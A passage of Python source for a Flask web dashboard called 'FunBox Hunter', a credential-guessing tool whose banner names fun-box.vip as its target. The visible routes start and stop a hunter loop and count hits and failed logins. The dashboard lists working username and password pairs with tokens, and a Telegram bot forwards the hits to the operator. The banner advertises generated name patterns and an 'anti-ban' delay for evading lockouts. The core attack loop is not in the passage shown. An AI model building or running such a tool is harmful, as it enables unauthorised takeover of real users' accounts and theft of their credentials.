    threading.Thread(target=hunter_loop, daemon=True).start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_hunter():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['running'] = False
    return jsonify({'success': True})

@app.route('/api/stats')
def get_stats():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({
        'success': True,
        'running': state['running'],
        'checked': state['checked'],
        'hits': state['hits'],
        'bad': state['bad'],
        'errors': state['errors'],
        'cpm': state.get('cpm', 0),
        'current_testing': state.get('current_testing', []),
        'start_time': int(state['start_time'].timestamp() * 1000) if state['start_time'] else None,
        'generated_count': state.get('generated_count', 0),
        'endpoint': LOGIN_ENDPOINT,
        'telegram_enabled': hunter.group_sender.enabled,
        'telegram_notifications': hunter.group_sender.notifications_active
    })

@app.route('/api/feed')
def get_feed():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'feed': state['feed'][:80]})

@app.route('/api/results')
def get_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    formatted = []
    for r in state['results'][:50]:
        formatted.append({
            'content': f"🎯 Fun-Box | {r.get('username', '')} | 🔑 {r.get('password', '')}",
            'token': r.get('token', 'N/A')[:20]
        })
    return jsonify({'success': True, 'results': formatted})

@app.route('/api/clear', methods=['POST'])
def clear_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['results'] = []
    state['feed'] = []
    state['hits'] = 0
    state['bad'] = 0
    hunter.results = []
    hunter.feed = []
    hunter.hits = 0
    hunter.bad = 0
    return jsonify({'success': True})

@app.route('/api/group/config', methods=['POST'])
def group_config():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    data = request.json or {}
    if data.get('telegram_token') and data.get('telegram_chat_id'):
        hunter.group_sender.set_telegram(data['telegram_token'], data['telegram_chat_id'])
        state['telegram_enabled'] = True
    return jsonify({
        'success': True, 
        'enabled': hunter.group_sender.enabled,
        'notifications': hunter.group_sender.notifications_active
    })

@app.route('/api/group/test', methods=['POST'])
def group_test():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    data = request.json or {}
    token = data.get('telegram_token', hunter.group_sender.telegram_bot_token)
    chat_id = data.get('telegram_chat_id', hunter.group_sender.telegram_chat_id)
    
    if not token or not chat_id:
        return jsonify({'success': False, 'message': '⚠️ Bot Token or Chat ID is empty'})
    
    old_token = hunter.group_sender.telegram_bot_token
    old_chat_id = hunter.group_sender.telegram_chat_id
    old_enabled = hunter.group_sender.enabled
    
    hunter.group_sender.set_telegram(token, chat_id)
    success, message = hunter.group_sender.test_connection()
    
    if not data.get('save', False):
        hunter.group_sender.telegram_bot_token = old_token
        hunter.group_sender.telegram_chat_id = old_chat_id
        hunter.group_sender.enabled = old_enabled
    
    return jsonify({'success': success, 'message': message})

@app.route('/api/group/notifications', methods=['POST'])
def group_notifications():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    enabled = request.json.get('enabled', True)
    hunter.group_sender.notifications_active = enabled
    state['telegram_notifications'] = enabled
    
    return jsonify({
        'success': True,
        'notifications': enabled
    })

@app.route('/api/endpoint/status')
def endpoint_status():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({
        'success': True,
        'endpoint': LOGIN_ENDPOINT,
        'url': LOGIN_URL,
        'file_exists': os.path.exists(ENDPOINT_FILE)
    })

# ================================================================
# HTML TEMPLATES
# ================================================================

LOGIN_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>FunBox Hunter</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#050508;font-family:'Share Tech Mono',monospace}
.login-box{background:rgba(0,0,0,0.92);border:1px solid rgba(0,255,65,0.15);border-radius:16px;padding:40px;width:400px;text-align:center}
.logo-text{font-family:'Orbitron',monospace;font-size:28px;color:#00ff41}
.logo-text span{color:#ff0044}
.subtitle{color:#006622;font-size:10px;margin:5px 0 15px;letter-spacing:3px}
.input-group input{width:100%;padding:14px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.08);border-radius:8px;color:#00ff41;font-size:16px;text-align:center;margin:10px 0}
.btn-login{width:100%;padding:14px;background:rgba(0,255,65,0.05);border:2px solid #00ff41;border-radius:8px;color:#00ff41;font-size:16px;cursor:pointer;font-family:'Orbitron',monospace}
.btn-login:hover{background:rgba(0,255,65,0.1)}
.error-msg{color:#ff0044;font-size:12px;margin-top:10px}
</style>
</head>
<body>
<div class="login-box">
    <div class="logo-text">FUN-BOX <span>HUNTER</span></div>
    <div class="subtitle">⚡ INFINITE GENERATOR + 500+ NAMES</div>
    <div class="input-group">
        <input type="password" id="passInput" placeholder="🔑 Enter Password">
    </div>
    <button class="btn-login" id="loginBtn">⚡ ACCESS</button>
    <div id="errorMsg" class="error-msg"></div>
</div>
<script>
document.getElementById('loginBtn').addEventListener('click', function(){
    const password = document.getElementById('passInput').value.trim();
    if(!password){document.getElementById('errorMsg').textContent='⚠️ Enter password';return;}
    fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password})})
    .then(res=>res.json()).then(data=>{
        if(data.success){window.location.href='/dashboard';}
        else{document.getElementById('errorMsg').textContent='❌ '+data.error;}
    });
});
</script>
</body>
</html>'''

DASHBOARD_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>FunBox Hunter</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;padding:10px}
.container{max-width:1200px;margin:0 auto}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;border-radius:8px 8px 0 0}
.header h1{font-family:'Orbitron',monospace;font-size:20px;color:#00ff41}
.header h1 span{color:#ffd700}
.btn-logout{color:#ff0044;border:1px solid #ff0044;padding:8px 20px;border-radius:6px;cursor:pointer;background:transparent;text-decoration:none}
.btn{background:transparent;border:1px solid rgba(0,255,65,0.2);color:#00ff41;padding:10px 20px;border-radius:6px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:13px;transition:all 0.3s}
.btn:hover:not(:disabled){background:rgba(0,255,65,0.05)}
.btn-start{background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-stop{border-color:#ff0044;color:#ff0044}
.btn-test{background:rgba(0,136,204,0.05);border-color:#0088cc;color:#0088cc}
.btn-notif-on{background:rgba(0,255,65,0.05);border-color:#00ff41;color:#00ff41}
.btn-notif-off{background:rgba(255,0,68,0.05);border-color:#ff0044;color:#ff0044}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:8px;padding:15px;margin-bottom:8px}
.stats-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin:10px 0;padding:15px;background:rgba(0,0,0,0.9);border:1px solid rgba(0,255,65,0.1);border-radius:10px}
.stat-item{text-align:center;padding:12px;border-radius:8px;background:rgba(0,0,0,0.6)}
.stat-item .number{font-size:28px;font-weight:700;display:block;font-family:'Orbitron',monospace}
.stat-item .label{font-size:9px;color:#006622;margin-top:4px;text-transform:uppercase}
.stat-item.hits .number{color:#00ff41}
.stat-item.bad .number{color:#ff0044}
.stat-item.total .number{color:#ffd700}
.stat-item.rate .number{color:#0088cc}
.stat-item.time .number{color:#0066ff;font-size:22px}
.stat-item.generated .number{color:#ff00ff}
.testing-box{background:rgba(255,170,0,0.05);border:1px solid rgba(255,170,0,0.2);border-radius:8px;padding:12px;margin:8px 0;min-height:50px}
.testing-box .content{color:#ffaa00;font-size:14px;font-weight:700;margin-top:5px}
.feed-container{max-height:150px;overflow-y:auto}
.feed-item{padding:4px 10px;font-size:10px;border-left:2px solid transparent;display:flex;gap:8px}
.feed-item.hit{background:rgba(0,255,65,0.04);border-left-color:#00ff41}
.feed-item.bad{background:rgba(255,0,68,0.06);border-left-color:#ff0044}
.feed-item .time{color:#006622;font-size:8px;min-width:50px}
.result-container{max-height:300px;overflow-y:auto}
.result-item{padding:6px 12px;font-size:10px;border-bottom:1px solid rgba(0,255,65,0.05);background:rgba(0,255,65,0.03)}
.telegram-box{background:rgba(0,136,204,0.03);border:1px solid rgba(0,136,204,0.15);border-radius:8px;padding:15px;margin:10px 0}
.telegram-box .title{color:#0088cc;font-size:14px;margin-bottom:8px}
.telegram-config{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;padding:10px;background:rgba(0,0,0,0.5);border-radius:6px}
.telegram-config input{padding:6px 10px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,136,204,0.1);border-radius:4px;color:#00ff41;font-size:10px;width:100%}
.telegram-config label{color:#006622;font-size:9px}
.telegram-controls{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px;align-items:center}
.control-bar{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.endpoint-info{color:#0088cc;font-size:10px;margin:5px 0;padding:5px;background:rgba(0,136,204,0.05);border-radius:4px}
.test-result{margin-top:8px;padding:8px;border-radius:4px;font-size:11px}
.test-success{color:#00ff41;background:rgba(0,255,65,0.05);border:1px solid rgba(0,255,65,0.1)}
.test-error{color:#ff0044;background:rgba(255,0,68,0.05);border:1px solid rgba(255,0,68,0.1)}
@media(max-width:768px){.stats-grid{grid-template-columns:repeat(3,1fr)}}
</style>
</head>
<body>
<div class="container">
    <header class="header">
        <h1>FUN-BOX <span>HUNTER</span> <span style="font-size:12px;color:#006622;">v3.0</span></h1>
        <a href="/logout" class="btn-logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
    </header>

    <div class="endpoint-info" id="endpointInfo">🔍 Endpoint: Loading...</div>

    <!-- Telegram -->
    <div class="telegram-box">
        <div class="title"><i class="fab fa-telegram"></i> TELEGRAM NOTIFICATIONS</div>
        <div class="telegram-config">
            <div><label>🤖 Bot Token</label><input type="text" id="tgToken" placeholder="Bot Token"></div>
            <div><label>💬 Chat ID</label><input type="text" id="tgChatId" placeholder="Chat ID"></div>
        </div>
        <div class="telegram-controls">
            <button class="btn" id="configGroupBtn" style="border-color:#0088cc;color:#0088cc;"><i class="fas fa-save"></i> Save</button>
            <button class="btn btn-test" id="testGroupBtn"><i class="fas fa-vial"></i> Test Connection</button>
            <button class="btn btn-notif-on" id="notifOnBtn"><i class="fas fa-bell"></i> Notifications ON</button>
            <button class="btn btn-notif-off" id="notifOffBtn"><i class="fas fa-bell-slash"></i> Notifications OFF</button>
            <span id="groupStatus" style="color:#006622;font-size:11px;">⚪ Disabled</span>
            <span id="notifStatus" style="color:#006622;font-size:11px;">🔔 ON</span>
        </div>
        <div id="testResult"></div>
    </div>

    <!-- Stats -->
    <div class="stats-grid" id="statsGrid">
        <div class="stat-item hits"><span class="number" id="statHits">0</span><span class="label">✅ HITS</span></div>
        <div class="stat-item bad"><span class="number" id="statBad">0</span><span class="label">❌ BAD</span></div>
        <div class="stat-item total"><span class="number" id="statTotal">0</span><span class="label">📊 TOTAL</span></div>
        <div class="stat-item rate"><span class="number" id="statRate">0%</span><span class="label">📈 SUCCESS</span></div>
        <div class="stat-item time"><span class="number" id="statTime">00:00</span><span class="label">⏱ ELAPSED</span></div>
        <div class="stat-item generated"><span class="number" id="statGenerated">0</span><span class="label">📦 GEN</span></div>
    </div>

    <div class="testing-box">
        <div class="content" id="currentTesting">⏳ Waiting...</div>
    </div>

    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> START</button>
            <button class="btn btn-stop" id="stopBtn"><i class="fas fa-stop"></i> STOP</button>
            <button class="btn" id="clearBtn" style="border-color:rgba(255,255,255,0.1);color:#006622;"><i class="fas fa-trash"></i> Clear</button>
            <span style="color:#006622;font-size:11px;">⚡ <span id="cpm">0</span> RPM</span>
            <span style="color:#ff0044;">⚠️ <span id="errorCount">0</span></span>
        </div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#00cc33;display:flex;gap:10px;margin-bottom:6px;">
            <span><i class="fas fa-broadcast"></i> FEED <span style="font-size:9px;color:#006622;" id="feedCount">(0)</span></span>
        </div>
        <div class="feed-container" id="feedContainer"><div style="text-align:center;padding:20px;color:#006622;font-size:11px;">⏳ Waiting...</div></div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#ffd700;display:flex;gap:10px;margin-bottom:6px;">
            <span><i class="fas fa-database"></i> HITS <span style="font-size:9px;color:#006622;" id="resultCount">(0)</span></span>
        </div>
        <div class="result-container" id="resultContainer"><div style="text-align:center;padding:20px;color:#006622;font-size:11px;">📭 No hits yet</div></div>
    </div>
</div>

<script>
const $ = id => document.getElementById(id);

async function api(endpoint, method='GET', data=null) {
    const opts = { method, headers: { 'Content-Type': 'application/json' } };
    if (data) opts.body = JSON.stringify(data);
    try {
        const res = await fetch(endpoint, opts);
        return await res.json();
    } catch (e) { return { success: false, error: e.message }; }
}

async function loadEndpoint() {
    const res = await api('/api/endpoint/status');
    if (res.success) {
        document.getElementById('endpointInfo').textContent = '🔍 Endpoint: ' + res.endpoint + ' | URL: ' + res.url;
    }
}
loadEndpoint();

document.getElementById('startBtn').addEventListener('click', async function() {
    const res = await api('/api/start', 'POST');
    if (res.success) {
        this.disabled = true;
        document.getElementById('stopBtn').disabled = false;
        this.textContent = '▶️ Running';
    }
});

document.getElementById('stopBtn').addEventListener('click', async function() {
    await api('/api/stop', 'POST');
    document.getElementById('startBtn').disabled = false;
    document.getElementById('startBtn').textContent = '▶️ START';
    this.disabled = true;
});

document.getElementById('clearBtn').addEventListener('click', async function() {
    if (!confirm('Clear all?')) return;
    await api('/api/clear', 'POST');
});

// Telegram
document.getElementById('configGroupBtn').addEventListener('click', async function() {
    const data = {
        telegram_token: document.getElementById('tgToken').value.trim(),
        telegram_chat_id: document.getElementById('tgChatId').value.trim()
    };
    if (!data.telegram_token || !data.telegram_chat_id) {
        alert('⚠️ Please enter both Bot Token and Chat ID');
        return;
    }
    const res = await api('/api/group/config', 'POST', data);
    if (res.success) {
        document.getElementById('groupStatus').textContent = res.enabled ? '✅ Enabled' : '⚪ Disabled';
        document.getElementById('groupStatus').style.color = res.enabled ? '#00ff41' : '#006622';
        alert('✅ Telegram config saved!');
    }
});

document.getElementById('testGroupBtn').addEventListener('click', async function() {
    const token = document.getElementById('tgToken').value.trim();
    const chatId = document.getElementById('tgChatId').value.trim();
    if (!token || !chatId) {
        alert('⚠️ Please enter Bot Token and Chat ID first');
        return;
    }
    
    this.disabled = true;
    this.textContent = '⏳ Testing...';
    document.getElementById('testResult').innerHTML = '';
    
    const res = await api('/api/group/test', 'POST', {
        telegram_token: token,
        telegram_chat_id: chatId,
        save: true
    });
    
    const resultDiv = document.getElementById('testResult');
    if (res.success) {
        resultDiv.innerHTML = '<div class="test-result test-success">✅ ' + res.message + '</div>';
        document.getElementById('groupStatus').textContent = '✅ Connected';
        document.getElementById('groupStatus').style.color = '#00ff41';
    } else {
        resultDiv.innerHTML = '<div class="test-result test-error">❌ ' + res.message + '</div>';
    }
    
    this.disabled = false;
    this.textContent = ' Test Connection';
});

document.getElementById('notifOnBtn').addEventListener('click', async function() {
    const res = await api('/api/group/notifications', 'POST', { enabled: true });
    if (res.success) {
        document.getElementById('notifStatus').textContent = '🔔 ON';
        document.getElementById('notifStatus').style.color = '#00ff41';
    }
});

document.getElementById('notifOffBtn').addEventListener('click', async function() {
    const res = await api('/api/group/notifications', 'POST', { enabled: false });
    if (res.success) {
        document.getElementById('notifStatus').textContent = '🔕 OFF';
        document.getElementById('notifStatus').style.color = '#ff0044';
    }
});

// Stats
async function updateStats() {
    try {
        const d = await api('/api/stats');
        if (!d.success) return;
        document.getElementById('statHits').textContent = d.hits || 0;
        document.getElementById('statBad').textContent = d.bad || 0;
        document.getElementById('statTotal').textContent = d.checked || 0;
        document.getElementById('statGenerated').textContent = d.generated_count || 0;
        const total = d.checked || 0;
        const hits = d.hits || 0;
        const rate = total > 0 ? ((hits / total) * 100).toFixed(1) : 0;
        document.getElementById('statRate').textContent = rate + '%';
        document.getElementById('cpm').textContent = d.cpm || 0;
        document.getElementById('errorCount').textContent = d.errors || 0;
        
        if (d.telegram_notifications !== undefined) {
            document.getElementById('notifStatus').textContent = d.telegram_notifications ? '🔔 ON' : '🔕 OFF';
            document.getElementById('notifStatus').style.color = d.telegram_notifications ? '#00ff41' : '#ff0044';
        }
        
        if (d.current_testing && d.current_testing.length > 0) {
            const ct = d.current_testing[0];
            document.getElementById('currentTesting').textContent = `${ct.username} | ${ct.status === 'hit' ? '✅ HIT' : ct.status === 'bad' ? '❌ BAD' : '🔄 Testing'}`;
            document.getElementById('currentTesting').style.color = ct.status === 'hit' ? '#00ff41' : ct.status === 'bad' ? '#ff0044' : '#ffaa00';
        } else {
            document.getElementById('currentTesting').textContent = '⏳ Waiting...';
            document.getElementById('currentTesting').style.color = '#ffaa00';
        }
        if (d.start_time) {
            const elapsed = Math.floor((Date.now() - d.start_time) / 1000);
            const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
            const secs = String(elapsed % 60).padStart(2, '0');
            document.getElementById('statTime').textContent = mins + ':' + secs;
        }
    } catch (e) { console.error(e); }
}

async function updateFeed() {
    try {
        const d = await api('/api/feed');
        if (!d.success) return;
        const c = document.getElementById('feedContainer');
        if (!d.feed || d.feed.length === 0) {
            c.innerHTML = '<div style="text-align:center;padding:20px;color:#006622;font-size:11px;">⏳ Waiting...</div>';
            return;
        }
        c.innerHTML = d.feed.slice(0, 50).map(item =>
            `<div class="feed-item ${item.type || 'info'}"><span class="time">${item.time || ''}</span><span>${item.text || ''}</span></div>`
        ).join('');
        document.getElementById('feedCount').textContent = '(' + d.feed.length + ')';
    } catch (e) { console.error(e); }
}

async function updateResults() {
    try {
        const d = await api('/api/results');
        if (!d.success) return;
        const c = document.getElementById('resultContainer');
        if (!d.results || d.results.length === 0) {
            c.innerHTML = '<div style="text-align:center;padding:20px;color:#006622;font-size:11px;">📭 No hits yet</div>';
            return;
        }
        c.innerHTML = d.results.slice(0, 50).map(item =>
            `<div class="result-item">${item.content} ${item.token ? '📄' : ''}</div>`
        ).join('');
        document.getElementById('resultCount').textContent = '(' + d.results.length + ')';
    } catch (e) { console.error(e); }
}

setInterval(updateStats, 500);
setInterval(updateFeed, 600);
setInterval(updateResults, 700);
setInterval(loadEndpoint, 10000);
updateStats(); updateFeed(); updateResults();
</script>
</body>
</html>'''

# ================================================================
# RUN
# ================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 6060))
    print("""
╔══════════════════════════════════════════════════════════════════╗
║   FUN-BOX.VIP ULTIMATE HUNTER - 500+ NAMES                     ║
║   🎯 Target: https://fun-box.vip                              ║
║   🔑 Infinite Name Generation (500+ English names)            ║
║   🧠 Smart Patterns: username, username+123, username+1-9    ║
║   🛡️ Anti-Ban: 3 min delay after 8 fails                    ║
║   📢 Telegram: Test + Notifications ON/OFF                   ║
║   🔌 No Proxy - Direct Connection                           ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server: http://localhost:{port}")
    print(f"[*] Password: {ADMIN_PASSWORD}")
    print(f"[*] Login Endpoint: {LOGIN_ENDPOINT}")
    print(f"[*] Total Names: {len(hunter.name_generator.first_names) + len(hunter.name_generator.last_names)}+ combinations")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
